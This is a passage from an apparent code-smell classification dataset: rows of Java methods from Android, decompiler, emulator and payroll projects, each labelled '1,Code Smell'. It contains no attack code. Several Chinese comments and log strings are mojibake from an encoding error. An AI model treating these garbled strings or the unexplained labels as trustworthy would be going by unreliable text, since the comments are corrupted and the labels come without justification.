  wm=(WindowManager)getSystemService(Context.WINDOW_SERVICE);
  params=new WindowManager.LayoutParams();
  int type;
  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
    type=WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
  }
 else {
    type=WindowManager.LayoutParams.TYPE_PHONE;
  }
  params.type=type;
  params.flags=WindowManager.LayoutParams.FLAG_ALT_FOCUSABLE_IM | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE | WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;
  params.format=PixelFormat.TRANSLUCENT;
  params.width=ViewGroup.LayoutParams.WRAP_CONTENT;
  params.height=ViewGroup.LayoutParams.WRAP_CONTENT;
  params.gravity=Gravity.CENTER;
  params.x=getResources().getDisplayMetrics().widthPixels;
  params.y=0;
  view=LayoutInflater.from(this).inflate(R.layout.av_voip_float_view,null);
  view.setOnTouchListener(onTouchListener);
  wm.addView(view,params);
  if (session.getState() != AVEngineKit.CallState.Connected && !(!session.isAudioOnly() && session.getState() == AVEngineKit.CallState.Outgoing)) {
    showUnConnectedCallInfo(session);
  }
 else {
    if (session.isScreenSharing()) {
      showScreenSharingView(session);
    }
 else     if (session.isAudioOnly()) {
      showAudioView(session);
    }
 else {
      String nextFocusUserId=nextFocusUserId(session);
      if (session.state == AVEngineKit.CallState.Outgoing) {
        nextFocusUserId=ChatManager.Instance().getUserId();
      }
      if (nextFocusUserId != null) {
        showVideoView(session,nextFocusUserId);
      }
 else {
        showAudioView(session);
      }
    }
  }
}",1,Code Smell
"/** 
 * 鎷疯礉 object 涓殑鍚屽悕鍙橀噺锛屼粠 from 鍒� to 涓�
 * @param from 鑾峰彇鏉ユ簮瀵硅薄
 * @param to   璁剧疆鐩爣瀵硅薄
 */
public static void copy(final Object from,final Object to) throws PlatformInternalException {
  Map<String,Field> fromFields=null;
  Map<String,Field> toFields=null;
  try {
    fromFields=analyze(from);
    toFields=analyze(to);
  }
 catch (  IllegalAccessException e) {
    throw new PlatformInternalException(""Can't analyse bean class"",e);
  }
  fromFields.keySet().retainAll(toFields.keySet());
  for (  Map.Entry<String,Field> fromFieldEntry : fromFields.entrySet()) {
    final String name=fromFieldEntry.getKey();
    final Field sourceField=fromFieldEntry.getValue();
    final Field targetField=toFields.get(name);
    sourceField.setAccessible(true);
    if (Modifier.isFinal(targetField.getModifiers())) {
      continue;
    }
    targetField.setAccessible(true);
    try {
      if (sourceField.get(from) == null) {
        continue;
      }
      if (targetField.getType().isAssignableFrom(sourceField.getType())) {
        targetField.set(to,sourceField.get(from));
      }
 else       if (sourceField.getType().isAssignableFrom(String.class) && targetField.getType().isAssignableFrom(JSONObject.class)) {
        targetField.set(to,JsonUtil.toJson((String)sourceField.get(from)));
      }
 else       if (targetField.getType().isAssignableFrom(String.class)) {
        targetField.set(to,JSONObject.toJSONString(sourceField.get(from)));
      }
    }
 catch (    IllegalAccessException e) {
      throw new PlatformInternalException(""Can't access field"",e);
    }
  }
}
",1,Code Smell
"private void bindExternalRelocations(MachOModule module){
  MachO.DysymtabCommand dysymtabCommand=module.dysymtabCommand;
  if (dysymtabCommand.nExtRel() <= 0) {
    return;
  }
  ByteBuffer buffer=module.buffer;
  buffer.limit((int)(dysymtabCommand.extRelOff() + dysymtabCommand.nExtRel() * 8));
  buffer.position((int)dysymtabCommand.extRelOff());
  ByteBuffer slice=buffer.slice();
  slice.order(ByteOrder.LITTLE_ENDIAN);
  Logger log=LoggerFactory.getLogger(""com.github.unidbg.ios."" + module.name);
  for (int i=0; i < dysymtabCommand.nExtRel(); i++) {
    Relocation relocation=Relocation.create(slice);
    if (relocation.pcRel || !relocation.extern || relocation.scattered|| relocation.length != (emulator.is64Bit() ? 3 : 2) || relocation.type != ARM_RELOC_VANILLA) {
      throw new IllegalStateException(""Unexpected relocation found."");
    }
    MachOSymbol symbol=module.getSymbolByIndex(relocation.symbolNum);
    Pointer pointer=UnidbgPointer.pointer(emulator,module.base + relocation.address);
    if (pointer == null) {
      throw new IllegalStateException();
    }
    boolean isWeakRef=(symbol.nlist.desc() & N_WEAK_REF) != 0;
    long address=resolveSymbol(module,symbol);
    if (address == 0L) {
      if (isWeakRef) {
        log.debug(""bindExternalRelocations failed symbol={}, isWeakRef=true"",symbol);
        pointer.setPointer(0,null);
      }
 else {
        log.warn(""bindExternalRelocations failed symbol={}, isWeakRef=false"",symbol);
      }
      module.addNotBoundSymbol(symbol.getName());
    }
 else {
      pointer.setPointer(0,UnidbgPointer.pointer(emulator,address));
      if (log.isDebugEnabled()) {
        log.debug(""bindExternalRelocations address=0x{}, symbolNum=0x{}, symbolName={}"",Long.toHexString(relocation.address),Integer.toHexString(relocation.symbolNum),symbol.getName());
      }
    }
  }
}",1,Code Smell
"@VisibleForTesting @NonNull static List<ActivityManager.RunningAppProcessInfo> parseRunningAppProcesses(@NonNull List<String> appProcessesDump){
  List<ActivityManager.RunningAppProcessInfo> runningAppProcessInfos=new ArrayList<>();
  Matcher aprMatcher;
  Matcher pkgrMatcher;
  String line;
  ListIterator<String> it=appProcessesDump.listIterator();
  if (!it.hasNext())   return runningAppProcessInfos;
  aprMatcher=APP_PROCESS_REGEX.matcher(it.next());
  while (it.hasNext()) {
    if (!aprMatcher.find(0)) {
      aprMatcher=APP_PROCESS_REGEX.matcher(it.next());
      continue;
    }
    String uid=aprMatcher.group(1);
    String pid=aprMatcher.group(2);
    String processName=aprMatcher.group(3);
    if (uid == null || pid == null || processName == null) {
      aprMatcher=APP_PROCESS_REGEX.matcher(it.next());
      continue;
    }
    line=it.next();
    aprMatcher=APP_PROCESS_REGEX.matcher(line);
    while (it.hasNext()) {
      if (aprMatcher.find(0)) {
        break;
      }
      pkgrMatcher=PKG_LIST_REGEX.matcher(line);
      if (!pkgrMatcher.find(0)) {
        line=it.next();
        aprMatcher=APP_PROCESS_REGEX.matcher(line);
        continue;
      }
      String pkgList=pkgrMatcher.group(1);
      if (pkgList != null) {
        ActivityManager.RunningAppProcessInfo info=new ActivityManager.RunningAppProcessInfo();
        info.uid=Integer.decode(uid);
        info.pid=Integer.decode(pid);
        info.processName=processName;
        String[] split=pkgList.split("", "");
        info.pkgList=new String[split.length];
        System.arraycopy(split,0,info.pkgList,0,split.length);
        runningAppProcessInfos.add(info);
      }
      line=it.next();
      aprMatcher=APP_PROCESS_REGEX.matcher(line);
    }
  }
  return runningAppProcessInfos;
}",1,Code Smell
"/** 
 * Usually ToolTipManager places a tooltip at (mouseLocation.x, mouseLocation.y + 20). In case that the tooltip would be partly outside of the screen, the ToolTipManager changes the location so that the entire tooltip fits on screen. But this can place the tooltip under the mouse location and hide the owner component. <p> This method checks whether the current mouse location is within tooltip bounds and corrects the y-location so that the tooltip is placed above the mouse location.
 */
private Point fixToolTipLocation(Component owner,Component contents,int x,int y){
  if (!(contents instanceof JToolTip) || !wasInvokedFromToolTipManager() || hasTipLocation(owner))   return null;
  PointerInfo pointerInfo=MouseInfo.getPointerInfo();
  if (pointerInfo == null)   return null;
  Point mouseLocation=pointerInfo.getLocation();
  Dimension tipSize=contents.getPreferredSize();
  Rectangle tipBounds=new Rectangle(x,y,tipSize.width,tipSize.height);
  if (!tipBounds.contains(mouseLocation))   return null;
  GraphicsConfiguration gc=null;
  for (  GraphicsDevice device : GraphicsEnvironment.getLocalGraphicsEnvironment().getScreenDevices()) {
    GraphicsConfiguration dgc=device.getDefaultConfiguration();
    if (dgc.getBounds().contains(mouseLocation)) {
      gc=dgc;
      break;
    }
  }
  if (gc == null && owner != null)   gc=owner.getGraphicsConfiguration();
  if (gc == null)   return null;
  Rectangle screenBounds=gc.getBounds();
  Insets screenInsets=Toolkit.getDefaultToolkit().getScreenInsets(gc);
  int screenTop=screenBounds.y + screenInsets.top;
  int newY=mouseLocation.y - tipSize.height - UIScale.scale(20);
  if (newY < screenTop)   return null;
  return new Point(x,newY);
}",1,Code Smell
"/** 
 * Scroll the screen down one line. To scroll the whole screen of a 24 line screen, the arguments would be (0, 24).
 * @param topMargin    First line that is scrolled.
 * @param bottomMargin One line after the last line that is scrolled.
 * @param style        the style for the newly exposed line.
 */
public void scrollDownOneLine(int topMargin,int bottomMargin,long style){
  if (topMargin > bottomMargin - 1 || topMargin < 0 || bottomMargin > mScreenRows)   throw new IllegalArgumentException(""topMargin="" + topMargin + "", bottomMargin=""+ bottomMargin+ "", mScreenRows=""+ mScreenRows);
  blockCopyLinesDown(mScreenFirstRow,topMargin);
  blockCopyLinesDown(externalToInternalRow(bottomMargin),mScreenRows - bottomMargin);
  mScreenFirstRow=(mScreenFirstRow + 1) % mTotalRows;
  if (mActiveTranscriptRows < mTotalRows - mScreenRows)   mActiveTranscriptRows++;
  int blankRow=externalToInternalRow(bottomMargin - 1);
  if (mLines[blankRow] == null) {
    mLines[blankRow]=new TerminalRow(mColumns,style);
  }
 else {
    mLines[blankRow].clear(style);
  }
}",1,Code Smell
"public FunctionExprent(int funcType,ListStack<Exprent> stack,Set<Integer> bytecodeOffsets){
  this(funcType,new ArrayList<Exprent>(),bytecodeOffsets);
  if (funcType >= FUNCTION_BIT_NOT && funcType <= FUNCTION_PPI && funcType != FUNCTION_CAST && funcType != FUNCTION_INSTANCEOF) {
    lstOperands.add(stack.pop());
  }
 else   if (funcType == FUNCTION_IIF) {
    throw new RuntimeException(""no direct instantiation possible"");
  }
 else {
    Exprent expr=stack.pop();
    lstOperands.add(stack.pop());
    lstOperands.add(expr);
  }
}
public FunctionExprent(int funcType,List<Exprent> operands,Set<Integer> bytecodeOffsets){
  super(EXPRENT_FUNCTION);
  this.funcType=funcType;
  this.lstOperands=operands;
  addBytecodeOffsets(bytecodeOffsets);
}
public FunctionExprent(int funcType,Exprent operand,Set<Integer> bytecodeOffsets){
  this(funcType,new ArrayList<Exprent>(1),bytecodeOffsets);
  lstOperands.add(operand);
}",1,Code Smell
"public InputMethodSubtype findSubtypeByLocale(final Locale locale){
  final List<InputMethodSubtype> subtypes=getMyEnabledInputMethodSubtypeList(true);
  final int count=subtypes.size();
  for (int i=0; i < count; ++i) {
    final InputMethodSubtype subtype=subtypes.get(i);
    final Locale subtypeLocale=InputMethodSubtypeCompatUtils.getLocaleObject(subtype);
    if (subtypeLocale.equals(locale)) {
      return subtype;
    }
  }
  for (int i=0; i < count; ++i) {
    final InputMethodSubtype subtype=subtypes.get(i);
    final Locale subtypeLocale=InputMethodSubtypeCompatUtils.getLocaleObject(subtype);
    if (subtypeLocale.getLanguage().equals(locale.getLanguage()) && subtypeLocale.getCountry().equals(locale.getCountry()) && subtypeLocale.getVariant().equals(locale.getVariant())) {
      return subtype;
    }
  }
  for (int i=0; i < count; ++i) {
    final InputMethodSubtype subtype=subtypes.get(i);
    final Locale subtypeLocale=InputMethodSubtypeCompatUtils.getLocaleObject(subtype);
    if (subtypeLocale.getLanguage().equals(locale.getLanguage()) && subtypeLocale.getCountry().equals(locale.getCountry())) {
      return subtype;
    }
  }
  for (int i=0; i < count; ++i) {
    final InputMethodSubtype subtype=subtypes.get(i);
    final Locale subtypeLocale=InputMethodSubtypeCompatUtils.getLocaleObject(subtype);
    if (subtypeLocale.getLanguage().equals(locale.getLanguage())) {
      return subtype;
    }
  }
  return null;
}",1,Code Smell
"/** 
 * <p>Appends to <code>builder</code> the comparison of <code>lhs</code> to <code>rhs</code> using the fields defined in <code>clazz</code>.</p>
 * @param lhs  left-hand object
 * @param rhs  right-hand object
 * @param clazz  <code>Class</code> that defines fields to be compared
 * @param builder  <code>CompareToBuilder</code> to append to
 * @param useTransients  whether to compare transient fields
 * @param excludeFields  fields to exclude
 */
private static void reflectionAppend(Object lhs,Object rhs,Class<?> clazz,CompareToBuilder builder,boolean useTransients,String[] excludeFields){
  Field[] fields=clazz.getDeclaredFields();
  AccessibleObject.setAccessible(fields,true);
  for (int i=0; i < fields.length && builder.comparison == 0; i++) {
    Field f=fields[i];
    if (!ArrayUtils.contains(excludeFields,f.getName()) && (f.getName().indexOf('$') == -1) && (useTransients || !Modifier.isTransient(f.getModifiers()))&& (!Modifier.isStatic(f.getModifiers()))) {
      try {
        builder.append(f.get(lhs),f.get(rhs));
      }
 catch (      IllegalAccessException e) {
        throw new InternalError(""Unexpected IllegalAccessException"");
      }
    }
  }
}",1,Code Smell
"@Override @Transactional(rollbackFor=Exception.class) public void saveInitConfig(HrmSalaryConfig salaryConfig){
  HrmSalaryConfig one=getOne(Wrappers.emptyWrapper());
  if (salaryConfig.getSalaryStartMonth() != null) {
    String salaryStartMonth=salaryConfig.getSalaryStartMonth();
    DateTime date=DateUtil.parse(salaryStartMonth,""yyyy-MM"");
    int month=date.month() + 1;
    int year=date.year();
    DateTime startTime=DateUtil.parse(year + ""-"" + month+ ""-""+ one.getSalaryCycleStartDay(),""yyyy-MM-dd"");
    DateTime endTime;
    if (one.getSalaryCycleStartDay() > 1) {
      DateTime dateTime=DateUtil.offsetMonth(startTime,1);
      int nextMonth=dateTime.month() + 1;
      endTime=DateUtil.parse(year + ""-"" + nextMonth+ ""-""+ one.getSalaryCycleEndDay(),""yyyy-MM-dd"");
    }
 else {
      endTime=DateUtil.parseDate(DateUtil.formatDate(DateUtil.endOfMonth(startTime)));
    }
    HrmSalaryMonthRecord salaryMonthRecord=new HrmSalaryMonthRecord();
    salaryMonthRecord.setTitle(month + ""鏈堣柂璧勬姤琛�"");
    salaryMonthRecord.setYear(year);
    salaryMonthRecord.setMonth(month);
    salaryMonthRecord.setStartTime(startTime);
    salaryMonthRecord.setEndTime(endTime);
    ApplicationContextHolder.getBean(IHrmSalaryMonthRecordService.class).save(salaryMonthRecord);
  }
  if (one == null) {
    save(salaryConfig);
  }
 else {
    salaryConfig.setConfigId(one.getConfigId());
    updateById(salaryConfig);
  }
  HrmSalaryConfig salaryConfig1=getOne(Wrappers.emptyWrapper());
  if (StrUtil.isNotEmpty(salaryConfig1.getSocialSecurityStartMonth())) {
    updateInitStatus(ConfigType.INSURANCE_INIT_CONFIG2.getValue());
    insuranceMonthRecordService.computeInsuranceData();
  }
  if (salaryConfig.getSalaryStartMonth() != null && salaryConfig1.getSalaryCycleStartDay() != null && salaryConfig1.getSocialSecurityMonthType() != null) {
    updateInitStatus(ConfigType.SALARY_INIT_CONFIG2.getValue());
  }
}",1,Code Smell
"@Override public boolean onTouch(View v,MotionEvent event){
  ViewGroup vg=(ViewGroup)v;
  if (event.getAction() == MotionEvent.ACTION_DOWN && vg.getChildCount() != 0 && vg.getChildAt(0).isEnabled()) {
    return false;
  }
  return super.onTouch(v,event);
}",1,Code Smell
"@Override protected void read(CompoundTag compound,boolean clientPacket){
  super.read(compound,clientPacket);
  transferTimer=compound.getInt(""Timer"");
  distance=compound.getFloat(""Distance"");
  boolean poweredPreviously=powered;
  powered=compound.getBoolean(""Powered"");
  if (clientPacket && powered != poweredPreviously && !powered)   notifyContraptions();
}
",1,Code Smell
"protected Pair<String,String> parseOutputParam(String outputParam){
  if (StringUtils.isEmpty(outputParam)) {
    log.info(""The task output param is empty"");
    return ImmutablePair.nullPair();
  }
  if ((!outputParam.startsWith(""${setValue("") && !outputParam.startsWith(""#{setValue("")) || !outputParam.endsWith("")}"")) {
    log.info(""The task output param {} should start with '${setValue(' or '#{setValue(' and end with ')}'"",outputParam);
    return ImmutablePair.nullPair();
  }
  String keyValueExpression=outputParam.substring(11,outputParam.length() - 2);
  if (!keyValueExpression.contains(""="")) {
    log.warn(""The task output param {} should composite with key=value"",outputParam);
    return ImmutablePair.nullPair();
  }
  String[] keyValue=keyValueExpression.split(""="",2);
  return ImmutablePair.of(keyValue[0],keyValue[1]);
}",1,Code Smell
"public void receiveClickPosition(Point point){
  if (point == null) {
    LogUtil.w(TAG,""收到空触摸消息"");
    return;
  }
  if (!touchBlockMode) {
    LogUtil.d(TAG,""当前非阻塞模式"");
    return;
  }
  LogUtil.d(TAG,""Receive Touch at time "" + System.currentTimeMillis());
  int x=point.x;
  int y=point.y;
  if (displayDialog || pauseFlag || nodeLoading|| isExecuting|| !isRecording) {
    return;
  }
  LogUtil.i(TAG,""Start notify Touch Event at (%d, %d)"",x,y);
  if (binder.checkInFloat(point)) {
    LogUtil.i(TAG,""点到了SoloPi"");
    startCallTime=System.currentTimeMillis();
    showFunctionView(null);
    return;
  }
  nodeLoading=true;
  try {
    AbstractNodeTree root=operationService.getCurrentRoot();
    AbstractNodeTree node=PositionLocator.findDeepestNode(root,x,y);
    LogUtil.i(TAG,""目标节点：%s"",node);
    if (node == null) {
      LogUtil.e(TAG,""Get node at ("" + x + "", ""+ y+ "") null"");
      return;
    }
    Rect bound=node.getNodeBound();
    float xFactor=(x - bound.left) / (float)bound.width();
    float yFactor=(y - bound.top) / (float)bound.height();
    localClickPos=new Pair<>(xFactor,yFactor);
    startCallTime=System.currentTimeMillis();
    showFunctionView(node);
  }
  finally {
    nodeLoading=false;
  }
}
",1,Code Smell
"public String getAccessToken(token token){
  try {
    String url;
    systemSetting systemSetting=systemService.selectSettingUrl();
    String tokenKind;
    String tokenName;
    if (token.isUseRefreshToken()) {
      tokenKind=reAccessToken;
      tokenName=""refresh_token"";
    }
 else {
      tokenKind=accessToken;
      tokenName=""session_token"";
    }
    if (systemSetting.getAutoToken_url().equals(""default"")) {
      String bingUrl=systemSetting.getBing();
      String[] parts=bingUrl.split("":"");
      url=""http://127.0.0.1"" + "":"" + parts[1] + ""/""+ systemSetting.getProxy_api_prefix()+ tokenKind;
    }
 else {
      url=systemSetting.getAutoToken_url() + tokenKind;
    }
    log.info(""灏嗛氳繃杩欎釜缃戝潃璇锋眰鐧诲綍淇℃伅锛"" + url);
    RequestBody requestBody=new MultipartBody.Builder().setType(MultipartBody.FORM).addFormDataPart(tokenName,token.getToken()).build();
    Request request=new Request.Builder().url(url).post(requestBody).build();
    Response response=client.newCall(request).execute();
    if (!response.isSuccessful()) {
      log.error(""Request failed: "" + response.body().string().trim());
      return null;
    }
    String responseContent=response.body().string();
    String resToken=null;
    try {
      JSONObject jsonResponse=new JSONObject(responseContent);
      resToken=jsonResponse.getString(""access_token"");
    }
 catch (    JSONException e) {
      e.printStackTrace();
    }
    if (response.code() == 200 && resToken != null && resToken.length() > 400) {
      return resToken;
    }
  }
 catch (  Exception e) {
    e.printStackTrace();
  }
  return null;
}",1,Code Smell
"public Optional<String> cdSyncOrRetry(String path,boolean customInput){
  if (Objects.equals(path,currentPath.get())) {
    return Optional.empty();
  }
  if (fileSystem == null) {
    return Optional.empty();
  }
  try {
    startIfNeeded();
  }
 catch (  Exception ex) {
    ErrorEvent.fromThrowable(ex).handle();
    return Optional.ofNullable(currentPath.get());
  }
  var adjustedPath=FileSystemHelper.adjustPath(this,path);
  if (!Objects.equals(path,adjustedPath)) {
    return Optional.of(adjustedPath);
  }
  String evaluatedPath;
  try {
    evaluatedPath=FileSystemHelper.evaluatePath(this,adjustedPath);
  }
 catch (  Exception ex) {
    ErrorEvent.fromThrowable(ex).handle();
    return Optional.ofNullable(currentPath.get());
  }
  if (customInput && evaluatedPath != null && !evaluatedPath.isBlank() && !FileNames.isAbsolute(evaluatedPath) && fileSystem.getShell().isPresent()) {
    var directory=currentPath.get();
    var name=adjustedPath + "" - "" + entry.get().getName();
    ThreadHelper.runFailableAsync(() -> {
      if (ShellDialects.getStartableDialects().stream().anyMatch(dialect -> adjustedPath.toLowerCase().startsWith(dialect.getExecutableName().toLowerCase()))) {
        TerminalLauncher.open(entry.getEntry(),name,directory,fileSystem.getShell().get().singularSubShell(ShellOpenFunction.of(adjustedPath)));
      }
 else {
        TerminalLauncher.open(entry.getEntry(),name,directory,fileSystem.getShell().get().command(adjustedPath));
      }
    }
);
    return Optional.ofNullable(currentPath.get());
  }
  String resolvedPath;
  try {
    resolvedPath=FileSystemHelper.resolveDirectoryPath(this,evaluatedPath,customInput);
  }
 catch (  Exception ex) {
    ErrorEvent.fromThrowable(ex).handle();
    return Optional.ofNullable(currentPath.get());
  }
  if (!Objects.equals(path,resolvedPath)) {
    return Optional.ofNullable(resolvedPath);
  }
  try {
    FileSystemHelper.validateDirectoryPath(this,resolvedPath,customInput);
    cdSyncWithoutCheck(path);
  }
 catch (  Exception ex) {
    ErrorEvent.fromThrowable(ex).handle();
    return Optional.ofNullable(currentPath.get());
  }
  return Optional.empty();
}
",1,Code Smell
"private void setThemeColor(TUIMessageBean messageBean){
  Context context=itemView.getContext();
  Resources resources=itemView.getResources();
  if (isReplyDetailMode || isForwardMode || !messageBean.isSelf()) {
    originMsgLayout.setBackgroundColor(resources.getColor(TUIThemeManager.getAttrResId(context,R.attr.chat_other_reply_quote_bg_color)));
    senderNameTv.setTextColor(resources.getColor(TUIThemeManager.getAttrResId(context,R.attr.chat_other_reply_quote_text_color)));
    replyContentTv.setTextColor(resources.getColor(TUIThemeManager.getAttrResId(context,R.attr.chat_other_reply_text_color)));
    line.setBackgroundColor(resources.getColor(TUIThemeManager.getAttrResId(context,R.attr.chat_other_reply_line_bg_color)));
  }
 else {
    originMsgLayout.setBackgroundColor(resources.getColor(TUIThemeManager.getAttrResId(context,R.attr.chat_self_reply_quote_bg_color)));
    senderNameTv.setTextColor(resources.getColor(TUIThemeManager.getAttrResId(context,R.attr.chat_self_reply_quote_text_color)));
    replyContentTv.setTextColor(resources.getColor(TUIThemeManager.getAttrResId(context,R.attr.chat_self_reply_text_color)));
    line.setBackgroundColor(resources.getColor(TUIThemeManager.getAttrResId(context,R.attr.chat_self_reply_line_bg_color)));
  }
}
",1,Code Smell
"@SneakyThrows @Override protected Object getColumnValue(ResultSet rs,int index,PropertyDescriptor pd){
  if (pd.getName().equals(""applicationFilters"")) {
    String applicationFiltersJson=rs.getString(""application_filters"");
    if (StringUtils.isEmpty(applicationFiltersJson)) {
      return null;
    }
    return mapper.readValue(applicationFiltersJson,new TypeReference<List<ApplicationFilter>>(){
    }
);
  }
 else   if (pd.getName().equals(""webhookIds"")) {
    String webhookIds=rs.getString(""webhook_ids"");
    if (StringUtils.isEmpty(webhookIds)) {
      return null;
    }
    return mapper.readValue(webhookIds,new TypeReference<List<String>>(){
    }
);
  }
 else   if (pd.getName().equals(""tags"")) {
    String tags=rs.getString(""tags"");
    if (StringUtils.isEmpty(tags)) {
      return null;
    }
    return mapper.readValue(tags,new TypeReference<List<String>>(){
    }
);
  }
 else {
    return super.getColumnValue(rs,index,pd);
  }
}
@SneakyThrows @Override protected Object getColumnValue(ResultSet rs,int index,PropertyDescriptor pd){
  if (pd.getName().equals(""webhookIds"")) {
    String webhookIds=rs.getString(""webhook_ids"");
    if (StringUtils.isEmpty(webhookIds)) {
      return null;
    }
    return mapper.readValue(webhookIds,new TypeReference<List<String>>(){
    }
);
  }
 else   if (pd.getName().equals(""tags"")) {
    String tags=rs.getString(""tags"");
    if (StringUtils.isEmpty(tags)) {
      return null;
    }
    return mapper.readValue(tags,new TypeReference<List<String>>(){
    }
);
  }
 else {
    return super.getColumnValue(rs,index,pd);
  }
}
",1,Code Smell
"/** 
 * This override allows the control points for PathInterpolators to be moved by the user, by dragging them into new positions. {@inheritDoc}
 */
@Override public boolean onTouchEvent(MotionEvent event){
  if (!mCubicPath && !mQuadraticPath) {
    return false;
  }
  int action=event.getAction();
  float scaledX=(event.getX() - (getWidth() * (1 - SCALE_FACTOR) / 2)) / SCALE_FACTOR;
  float scaledY=(event.getY() - (getHeight() * (1 - SCALE_FACTOR) / 2)) / SCALE_FACTOR;
  float x=Math.max(Math.min(scaledX / getWidth(),1),0);
  float y=Math.max(Math.min((1 - scaledY / getHeight()),1),0);
  boolean handled=false;
switch (action) {
case MotionEvent.ACTION_DOWN:
    if (Math.abs(x - mCx1) < .05f && Math.abs(y - mCy1) < .05f) {
      mMovingC1=true;
      handled=true;
    }
 else     if (mCubicPath && Math.abs(x - mCx2) < .05f && Math.abs(y - mCy2) < .05f) {
      mMovingC2=true;
      handled=true;
    }
  break;
case MotionEvent.ACTION_MOVE:
if (mMovingC1) {
  mCx1=x;
  mCy1=y;
  if (mPathCallback != null) {
    mPathCallback.onControlPoint1Moved(x,y);
  }
}
 else if (mMovingC2) {
  mCx2=x;
  mCy2=y;
  if (mPathCallback != null) {
    mPathCallback.onControlPoint2Moved(x,y);
  }
}
setupPathInterpolator();
handled=true;
break;
case MotionEvent.ACTION_UP:
handled=true;
mMovingC1=mMovingC2=false;
break;
}
if (handled) {
invalidate();
}
return handled;
}",1,Code Smell
"protected void createMissionControlSocket(){
  TCPUtils.LogSection ls=new TCPUtils.LogSection(""Creating MissionControlSocket"");
  ClientAgentConnection cac=currentMissionInit().getClientAgentConnection();
  if (this.missionControlSocket == null || this.missionControlSocket.getPort() != cac.getAgentMissionControlPort() || this.missionControlSocket.getAddress() == null || !this.missionControlSocket.isValid() || !this.missionControlSocket.isOpen() || !this.missionControlSocket.getAddress().equals(cac.getAgentIPAddress())) {
    if (this.missionControlSocket != null)     this.missionControlSocket.close();
    this.missionControlSocket=new TCPSocketChannel(cac.getAgentIPAddress(),cac.getAgentMissionControlPort(),""mcp"");
  }
  ls.close();
}
",1,Code Smell
"public void setData(Object object,CharSequence name,CharSequence status,int resId){
  setData(object,null,name,status,resId,false);
}
public void setData(Object object,CharSequence name,CharSequence status,int resId,boolean divider){
  setData(object,null,name,status,resId,divider);
}
public void setData(Object object,TLRPC.EncryptedChat ec,CharSequence name,CharSequence status,int resId,boolean divider){
  if (object == null && name == null && status == null) {
    currentStatus=null;
    currentName=null;
    currentObject=null;
    nameTextView.setText("""");
    statusTextView.setText("""");
    avatarImageView.setImageDrawable(null);
    return;
  }
  encryptedChat=ec;
  currentStatus=status;
  try {
    if (name != null && nameTextView != null) {
      name=Emoji.replaceEmoji(name,nameTextView.getPaint().getFontMetricsInt(),AndroidUtilities.dp(18),false);
    }
  }
 catch (  Exception ignore) {
  }
  currentName=name;
  currentObject=object;
  currentDrawable=resId;
  needDivider=divider;
  setWillNotDraw(!needDivider);
  update(0);
}",1,Code Smell
"/** 
 * 涓板瘜 configuration schema 鍐呭锛屽鏋滈粯璁や笉瀛樺湪浠讳綍 workflow task锛岄偅涔堥粯璁ゅ～鍏�
 * @param configurationSchema Workflow Configuration Schema
 */
private void enrichConfigurationSchema(DeployAppSchema configurationSchema){
  DeployAppSchema.Workflow workflow=configurationSchema.getSpec().getWorkflow();
  if (workflow == null || workflow.getSteps() == null || workflow.getSteps().size() == 0) {
    DeployAppSchema.Workflow defaultWorkflow=DeployAppSchema.Workflow.builder().steps(List.of(DeployAppSchema.WorkflowStep.builder().type(WorkflowConstant.DEFAULT_WORKFLOW_TYPE).name(WorkflowConstant.DEFAULT_WORKFLOW_TYPE).stage(WorkflowConstant.DEFAULT_WORKFLOW_STAGE.toString()).inputs(new ArrayList<>()).outputs(new ArrayList<>()).properties(new JSONObject()).build())).build();
    configurationSchema.getSpec().setWorkflow(defaultWorkflow);
  }
  for (int i=0; i < workflow.getSteps().size(); i++) {
    DeployAppSchema.WorkflowStep step=workflow.getSteps().get(i);
    String type=step.getType();
    if (StringUtils.isEmpty(type)) {
      throw new AppException(AppErrorCode.INVALID_USER_ARGS,""empty type in workflow steps"");
    }
    String name=step.getName();
    if (StringUtils.isEmpty(name)) {
      step.setName(String.format(""%s-%d"",type,i));
    }
  }
}",1,Code Smell
"void doAddOp(int containerViewId,Fragment fragment,@Nullable String tag,int opcmd){
  final Class<?> fragmentClass=fragment.getClass();
  final int modifiers=fragmentClass.getModifiers();
  if (fragmentClass.isAnonymousClass() || !Modifier.isPublic(modifiers) || (fragmentClass.isMemberClass() && !Modifier.isStatic(modifiers))) {
    throw new IllegalStateException(""Fragment "" + fragmentClass.getCanonicalName() + "" must be a public static class to be  properly recreated from""+ "" instance state."");
  }
  if (tag != null) {
    if (fragment.mTag != null && !tag.equals(fragment.mTag)) {
      throw new IllegalStateException(""Can't change tag of fragment "" + fragment + "": was ""+ fragment.mTag+ "" now ""+ tag);
    }
    fragment.mTag=tag;
  }
  if (containerViewId != 0) {
    if (containerViewId == View.NO_ID) {
      throw new IllegalArgumentException(""Can't add fragment "" + fragment + "" with tag ""+ tag+ "" to container view with no id"");
    }
    if (fragment.mFragmentId != 0 && fragment.mFragmentId != containerViewId) {
      throw new IllegalStateException(""Can't change container ID of fragment "" + fragment + "": was ""+ fragment.mFragmentId+ "" now ""+ containerViewId);
    }
    fragment.mContainerId=fragment.mFragmentId=containerViewId;
  }
  addOp(new Op(opcmd,fragment));
}",1,Code Smell
"private boolean isRenaming(GeyserSession session,AnvilContainer anvilContainer,boolean bedrock){
  if (anvilContainer.getResult().isEmpty()) {
    return false;
  }
  Component originalName=anvilContainer.getInput().getComponent(DataComponentTypes.CUSTOM_NAME);
  if (bedrock && originalName != null && anvilContainer.getNewName() != null) {
    String legacyOriginalName=MessageTranslator.convertMessage(originalName,session.locale());
    return !legacyOriginalName.equals(anvilContainer.getNewName());
  }
  return !Objects.equals(originalName,anvilContainer.getResult().getComponent(DataComponentTypes.CUSTOM_NAME));
}
",1,Code Smell
"/** 
 * 閫氳繃batchId鍒犻櫎
 * @param batchId batchId
 * @return data
 */
@Override public void deleteByBatchId(List<String> batchId){
  if (batchId.size() == 0) {
    return;
  }
  List<AdminFile> fileList=lambdaQuery().select(AdminFile::getFileId).in(AdminFile::getBatchId,batchId).list();
  List<Long> fileIdList=fileList.stream().map(AdminFile::getFileId).collect(Collectors.toList());
  fileIdList.forEach(this::deleteById);
}
@Override public void deleteByBatchId(AdminDeleteByBatchIdBO deleteByBatchIdBO){
  Integer type=deleteByBatchIdBO.getType();
  String fileType="""";
  if (Objects.equals(1,type)) {
    fileType=""file"";
  }
 else   if (Objects.equals(2,type)) {
    fileType=""img"";
  }
